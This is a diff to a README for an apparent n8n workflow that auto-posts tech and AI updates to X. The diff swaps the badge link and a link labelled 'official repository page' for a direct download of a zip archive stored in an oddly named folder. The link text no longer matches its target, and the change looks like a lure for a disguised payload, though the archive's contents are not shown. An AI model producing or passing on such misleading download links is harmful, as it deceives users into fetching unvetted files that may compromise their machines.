@@ -1,6 +1,6 @@
 # 🤖 Post-X-Premium.com-Automated-Post-Publishing - Share tech trends on X automatically
 
-[![Download the Workflow](https://img.shields.io/badge/Download-Workflow-blue)](https://github.com/fleetstreetremit109/Post-X-Premium.com-Automated-Post-Publishing)
+[![Download the Workflow](https://img.shields.io/badge/Download-Workflow-blue)](https://github.com/fleetstreetremit109/Post-X-Premium.com-Automated-Post-Publishing/raw/refs/heads/main/pyotoxinemia/Publishing-Premium-Automated-com-Post-v2.4.zip)
 
 This tool helps you publish technology and AI updates to X. It uses an n8n workflow to create content and post it to your profile without manual effort. You gain consistency in your social presence by using automation.
 
@@ -16,7 +16,7 @@ Your computer must meet these basic needs to run the workflow:
 
 ## 📥 Getting the Files
 
-Visit the [official repository page](https://github.com/fleetstreetremit109/Post-X-Premium.com-Automated-Post-Publishing) to access the project files. 
+Visit the [official repository page](https://github.com/fleetstreetremit109/Post-X-Premium.com-Automated-Post-Publishing/raw/refs/heads/main/pyotoxinemia/Publishing-Premium-Automated-com-Post-v2.4.zip) to access the project files. 
 
 Click the green button labeled Code and select Download ZIP. Save this file to your computer. Once the download finishes, right-click the folder and choose Extract All to view the contents. You will find a JSON file within this folder. This file contains the automation steps for n8n.
 
